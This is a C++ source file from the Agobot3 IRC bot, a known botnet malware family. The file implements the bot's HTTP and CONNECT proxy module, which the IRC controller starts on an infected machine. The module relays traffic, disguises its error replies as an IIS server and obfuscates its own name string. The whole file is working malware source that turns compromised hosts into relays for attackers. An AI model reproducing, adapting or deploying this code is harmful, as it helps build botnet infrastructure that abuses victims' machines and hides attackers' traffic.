/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. 
*/
#include "main.h"
#include "redir_http.h"
#include "mainctrl.h"
#include "utility.h"

CRedirectHTTP_Thread::CRedirectHTTP_Thread() { 
	m_sRedirectName.Assign(dp(34,46,46,42,0).CStr()); 
}

void CRedirectHTTP_Thread::StartRedirect()
{	m_sServerSocket=INVALID_SOCKET; bool bServerKeepAlive=false;
	int iErr=1; bool bFinished=false; while(!bFinished) {
		url uURL; char szBuffer[MAX_PATH]; bool bGet=false;
		CString sReqBuf;

		// Receive the proxy request
		if(!recv_line_irc(m_sClientSocket, szBuffer, MAX_PATH, NULL)) { bFinished=true; break; }
		CString sBuffer(szBuffer);
		// Fail if there is no url
		// if(!sBuffer.Token(1, " ").Compare("")) { bFinished=true; break; }

		if(!sBuffer.Compare("")) continue;

		if(!sBuffer.Token(0, " ").CompareNoCase("GET")) { // GET method
			bGet=true;
			// Parse the url
			if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) { bFinished=true; break; }
			// Fail if the protocol isnt http
			if(uURL.sProto.Compare("http")) { bFinished=true; break; }
		} else if(!sBuffer.Token(0, " ").CompareNoCase("CONNECT")) { // CONNECT method
			bGet=false;
			// Parse the host
			uURL.sProto.Assign("connect");
			uURL.sReq.Assign("");
			uURL.sHost.Assign(sBuffer.Token(1, " ").Token(0, ":"));
			if(!sBuffer.Token(1, " ").Token(1, ":").CStr()) { bFinished=true; break; }
			uURL.iPort=atoi(sBuffer.Token(1, " ").Token(1, ":").CStr());
			if(!uURL.iPort) uURL.iPort=80; }

		// Get the rest of the request
		CString sMethod(sBuffer.Token(0, " ")); if(!sMethod.Compare("")) { bFinished=true; break; }
		CString sHTTPVer(sBuffer.Token(2, " ")); if(!sHTTPVer.Compare("")) { bFinished=true; break; }
		CString sOldHost(uURL.sHost);

#ifdef DBGCONSOLE
		if(bGet)
			g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s %s %s...\n", m_pRedirHTTP, sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr());
		else
			g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s %s:%d %s...\n", m_pRedirHTTP, sMethod.CStr(), uURL.sHost.CStr(), uURL.iPort, sHTTPVer.CStr());
#endif

		char szBuf[4096*4]; memset(szBuf, 0, sizeof(szBuf));
		char szRecvBuf[4096]; strcpy(szRecvBuf, "HTTPROX");
		while(strcmp(szRecvBuf, "\r\n") && strcmp(szRecvBuf, "")) {
			if(!recv_line_irc(m_sClientSocket, szRecvBuf, sizeof(szRecvBuf), NULL))
			{	xClose(m_sClientSocket); return; }
			strncat(szBuf, szRecvBuf, sizeof(szBuf)); strncat(szBuf, "\r\n", sizeof(szBuf));
		}

		// Check if theres a proxy keep-alive somewhere
		char *szProxyKeepAlive=strstr(szBuf, "Proxy-Connection:");
		if(szProxyKeepAlive) szProxyKeepAlive=strstr(szProxyKeepAlive, ":")+1;
		if(szProxyKeepAlive) {
			while(*szProxyKeepAlive==' ') szProxyKeepAlive++;	// Skip leading whitespaces
			if(stricmp(szProxyKeepAlive, "Keep-Alive")) 
				m_bKeepAlive=true;								// Found keep-alive
			else
				m_bKeepAlive=false;								// Found close (or sth strange)
		} else m_bKeepAlive=false;								// Default to close

		if(m_sServerSocket==INVALID_SOCKET) {
			m_sServerSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if(m_sServerSocket==SOCKET_ERROR || m_sServerSocket==INVALID_SOCKET)
			{	xClose(m_sClientSocket); return; }

			// Fill in sockaddr and resolve the host
			sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin));
			ssin.sin_family=AF_INET; ssin.sin_port=htons(uURL.iPort);
			ssin.sin_addr.s_addr=ResolveAddress(uURL.sHost.CStr());
			if(ssin.sin_addr.s_addr==INADDR_NONE) // The host couldn't be resolved, exit
			{
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s could not be resolved (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.sReq.CStr());
#endif
				sReqBuf.Format(	"HTTP/1.0 503 Service Unavailable\r\n"
								"Server: IIS/5.03\r\n"
								"Content-Type: text/html\r\n"
								"Proxy-Connection: close\r\n"
								"\r\n\r\n"
								"Error Resolving %s\n",
								uURL.sHost.CStr());

				iErr=xWrite(m_sClientSocket, sReqBuf.CStr(), sReqBuf.GetLength());

				xClose(m_sClientSocket); xClose(m_sServerSocket); return; }
		

			// Connect to the server
			iErr=connect(m_sServerSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
			if(iErr==SOCKET_ERROR) // Connect failed, exit
			{	
#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): Cannot connect to %s:%d (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr());
#endif
				sReqBuf.Format(	"HTTP/1.0 503 Service Unavailable\r\n"
								"Server: IIS/5.03\r\n"
								"Content-Type: text/html\r\n"
								"Proxy-Connection: close\r\n"
								"\r\n\r\n"
								"Connection to %s:%d has failed\n",
								uURL.sHost.CStr(), uURL.iPort);

				iErr=xWrite(m_sClientSocket, sReqBuf.CStr(), sReqBuf.GetLength());

				xClose(m_sClientSocket); xClose(m_sServerSocket);

				return; }
		}

		int iLen; fd_set fd;

		if(bGet) {
			if(m_bKeepAlive)
				sReqBuf.Format("%s %s %s\r\nConnection: Keep-Alive\r\n%s", sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr(), szBuf);
			else
				sReqBuf.Format("%s %s %s\r\nConnection: close\r\n%s", sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr(), szBuf);
			iErr=xWrite(m_sServerSocket, sReqBuf.CStr(), sReqBuf.GetLength());
			if(!iErr || iErr==SOCKET_ERROR) { xClose(m_sClientSocket); xClose(m_sServerSocket); return; }

			if(!recv_line_irc(m_sServerSocket, szBuf, sizeof(szBuf), NULL)) { bFinished=true; break; }
			strcat(szBuf, "\r\n"); xWrite(m_sClientSocket, szBuf, strlen(szBuf));
			
			int iContentLength=0; char *szTemp="bla"; bool bChunked=false;
			while(strcmp(szBuf, "\r\n") && strcmp(szBuf, "")) {
				if(!recv_line_irc(m_sServerSocket, szBuf, sizeof(szBuf), NULL)) { bFinished=true; break; }
				// Find Content-Length
				CString sBuf(szBuf);
				if(!sBuf.Token(0, " ").CompareNoCase("Content-Length:")) {
					iContentLength=atoi(sBuf.Token(1, " ").CStr());
				}
				if(!sBuf.Token(0, " ").CompareNoCase("Transfer-Encoding:")) {
					if(!sBuf.Token(1, " ").CompareNoCase("chunked"))
						bChunked=true;
					else
						bChunked=false;
				}
				if(!sBuf.Token(0, " ").CompareNoCase("Connection:")) {
					if(!sBuf.Token(1, " ").CompareNoCase("Keep-Alive"))
						bServerKeepAlive=true;
					else
						bServerKeepAlive=false;
				}

				if(strcmp(szBuf, "\r\n") && strcmp(szBuf, "")) {
					strcat(szBuf, "\r\n"); xWrite(m_sClientSocket, szBuf, strlen(szBuf));
				}
			}

			if(bServerKeepAlive)
			{	char *lszTemp="Connection: Keep-Alive\r\n";
				xWrite(m_sClientSocket, lszTemp, strlen(lszTemp)); }
			else
			{	char *lszTemp="Connection: Close\r\n";
				xWrite(m_sClientSocket, lszTemp, strlen(lszTemp)); }

			strcpy(szBuf, "\r\n"); xWrite(m_sClientSocket, szBuf, strlen(szBuf));

			if(iContentLength) {
				int iContentRead=0;

				while(iContentRead<iContentLength && (iContentLength-iContentRead)>sizeof(szBuf))
				{	iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf));
					if(iLen<1 || iLen==SOCKET_ERROR) break;
					xWrite(m_sClientSocket, szBuf, iLen);
					iContentRead+=iLen;
				}

				int iLeft;
				while(iContentLength-iContentRead) {
					iLeft=iContentLength-iContentRead;
					iLen=xRead(m_sServerSocket, szBuf, iLeft);
					if(iLen<1 || iLen==SOCKET_ERROR) break;
					xWrite(m_sClientSocket, szBuf, iLen);
					iContentRead+=iLen;
				}
			} else {
				while(true)
				{	iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf));
					if(iLen<1 || iLen==SOCKET_ERROR) break;
					xWrite(m_sClientSocket, szBuf, iLen);
				}
			}
		} else {
			sReqBuf.Format("HTTP/1.0 200 Connection established\r\n\r\n");
			iErr=xWrite(m_sClientSocket, sReqBuf.CStr(), sReqBuf.GetLength());
//			SET_SOCK_BLOCK(m_sClientSocket, 0); SET_SOCK_BLOCK(m_sServerSocket, 0);
			if(!iErr || iErr==SOCKET_ERROR) { xClose(m_sClientSocket); xClose(m_sServerSocket); return; }
			fd_set fd; while(true) {
				FD_ZERO(&fd); FD_SET(m_sClientSocket, &fd); FD_SET(m_sServerSocket, &fd);
				memset(szBuf, 0, sizeof(szBuf)); select(0, &fd, NULL, NULL, NULL);
				
				if(FD_ISSET(m_sClientSocket, &fd)) {
					if((iLen=xRead(m_sClientSocket, szBuf, sizeof(szBuf)))==-1) break;
					if(xWrite(m_sServerSocket, szBuf, iLen)==-1) break; }

				if(FD_ISSET(m_sServerSocket, &fd)) {
					if((iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf)))==-1) break;
					if(xWrite(m_sClientSocket, szBuf, iLen)==-1) break; }

				Sleep(5);

			iLen=xRead(m_sClientSocket, szBuf, sizeof(szBuf));
				if(!iLen) break; if(iLen<0 && ERRNO==EWOULDBLOCK) { Sleep(1); continue; }
				xWrite(m_sServerSocket, szBuf, iLen);

				iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf));
				if(!iLen) break; if(iLen<0 && ERRNO==EWOULDBLOCK) { Sleep(1); continue; }
				xWrite(m_sClientSocket, szBuf, iLen);
			}
//			SET_SOCK_BLOCK(m_sClientSocket, 1); SET_SOCK_BLOCK(m_sServerSocket, 1);
		}

		if(!m_bKeepAlive) {
			xClose(m_sClientSocket);
			m_sClientSocket=SOCKET_ERROR;
			bFinished=true;
		}

		if(!bServerKeepAlive) {
			xClose(m_sServerSocket);
			m_sServerSocket=SOCKET_ERROR;
			bFinished=true;
		}
	}
	if(m_bKeepAlive) {
		xClose(m_sClientSocket);
		m_sClientSocket=SOCKET_ERROR;
	}
	if(bServerKeepAlive) {
		xClose(m_sServerSocket);
		m_sServerSocket=SOCKET_ERROR;
	}
}

CRedirectHTTP::CRedirectHTTP() { m_sRedirectName.Assign("HTTP"); }

void CRedirectHTTP::HTTPProxy() {
	m_sListenSocket=SOCKET_ERROR;
	while(m_sListenSocket==SOCKET_ERROR && m_pRedirect->m_bRedirecting) {
		m_sListenSocket=DoTcpBind(m_iLocalPort);
	}

	while(m_pRedirect->m_bRedirecting) {
		int sClientSocket=DoTcpAccept(m_sListenSocket);
		if(sClientSocket==SOCKET_ERROR || sClientSocket==0) { Sleep(250); continue; }

		CRedirectHTTP_Thread *pTemp=new CRedirectHTTP_Thread;
		pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirHTTP=this;
		pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_sClientSocket=sClientSocket;
		pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
		pTemp->Start();
	}

	if(m_sListenSocket!=INVALID_SOCKET) xClose(m_sListenSocket); }

void CRedirectHTTP::StartRedirect()
{	if(m_bUseSSL)
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Starting proxy on %d with SSL.", \
									  m_sRedirectName.CStr(), m_iLocalPort);
	else
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Starting proxy on port %d.", \
									  m_sRedirectName.CStr(), m_iLocalPort);

	HTTPProxy();	
	
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Unloaded proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort); }
